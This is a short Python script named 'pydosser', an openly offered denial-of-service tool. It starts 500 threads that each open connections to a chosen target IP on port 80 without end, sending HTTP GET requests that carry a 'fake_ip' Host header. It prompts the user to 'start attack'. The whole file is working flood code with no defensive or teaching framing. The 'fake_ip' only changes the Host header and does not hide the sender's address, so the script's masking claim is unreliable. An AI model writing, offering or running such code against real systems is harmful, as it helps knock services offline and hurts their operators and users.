#pydosser open source no copyright

import socket
import threading

input ('press enter to start attack:>>')

target = '192.168.0.1' 
fake_ip = '182.21.20.32'
port = 80

#enter your target, ip mask and port above

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()


for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
    print ('packet sent to:>>' + target)